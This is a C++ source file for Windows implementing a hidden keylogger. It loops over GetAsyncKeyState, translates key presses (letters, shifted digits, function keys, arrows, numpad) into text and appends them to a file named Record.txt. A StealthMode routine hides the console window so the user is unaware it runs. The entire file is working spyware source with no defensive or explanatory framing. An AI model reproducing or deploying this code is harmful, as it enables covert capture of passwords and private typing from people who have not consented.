#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void StealthMode();
void key();

void key()
{
    char c;

    for (;;)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                ofstream write("Record.txt", ios::app);

                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91))
                {
                    write << c;
                    write.close();
                    break;
                }
                else
                {
                    switch (c)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ")";
                        else
                            write << "0";
                    }
                    break;

                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "!";
                        else
                            write << "1";
                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "@";
                        else
                            write << "2";
                    }
                    break;
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "#";
                        else
                            write << "3";
                    }
                    break;
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "$";
                        else
                            write << "4";
                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "%";
                        else
                            write << "5";
                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "^";
                        else
                            write << "6";
                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "&";
                        else
                            write << "7";
                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "*";
                        else
                            write << "8";
                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "(";
                        else
                            write << "9";
                    }
                    break;
                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n";
                        break;
                    case VK_TAB:
                        write << "\t";
                        break;
                    case VK_BACK:
                        write << "<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    // Add cases for function keys (F1 to F12)
                    case VK_F1:
                        write << "<F1>";
                        break;
                    case VK_F2:
                        write << "<F2>";
                        break;
                    case VK_F3:
                        write << "<F3>";
                        break;
                    case VK_F4:
                        write << "<F4>";
                        break;
                    case VK_F5:
                        write << "<F5>";
                        break;
                    case VK_F6:
                        write << "<F6>";
                        break;
                    case VK_F7:
                        write << "<F7>";
                        break;
                    case VK_F8:
                        write << "<F8>";
                        break;
                    case VK_F9:
                        write << "<F9>";
                        break;
                    case VK_F10:
                        write << "<F10>";
                        break;
                    case VK_F11:
                        write << "<F11>";
                        break;
                    case VK_F12:
                        write << "<F12>";
                        break;
                    // Add cases for arrow keys
                    case VK_UP:
                        write << "<Up>";
                        break;
                    case VK_DOWN:
                        write << "<Down>";
                        break;
                    case VK_LEFT:
                        write << "<Left>";
                        break;
                    case VK_RIGHT:
                        write << "<Right>";
                        break;

                        // Add cases for other special keys you wish to log
                        // For example, Shift, Ctrl, Alt, CapsLock, etc.
                        // Use VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL, etc.
                        // Numpad keys
                    case VK_NUMPAD0:
                        write << "0";
                        break;
                    case VK_NUMPAD1:
                        write << "1";
                        break;
                    case VK_NUMPAD2:
                        write << "2";
                        break;
                    case VK_NUMPAD3:
                        write << "3";
                        break;
                    case VK_NUMPAD4:
                        write << "4";
                        break;
                    case VK_NUMPAD5:
                        write << "5";
                        break;
                    case VK_NUMPAD6:
                        write << "6";
                        break;
                    case VK_NUMPAD7:
                        write << "7";
                        break;
                    case VK_NUMPAD8:
                        write << "8";
                        break;
                    case VK_NUMPAD9:
                        write << "9";
                        break;

                    // Numpad special keys
                    case VK_MULTIPLY:
                        write << "*";
                        break;
                    case VK_ADD:
                        write << "+";
                        break;
                    case VK_SUBTRACT:
                        write << "-";
                        break;
                    case VK_DECIMAL:
                        write << ".";
                        break;
                    case VK_DIVIDE:
                        write << "/";
                        break;

                    default:
                        write << c;
                    }
                }
                write.close();
                break; // Be mindful of this break; it exits the loop after logging a key press
            }
        }
    }
}

void StealthMode()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main()
{
    StealthMode();
    key();

    return 0;
}
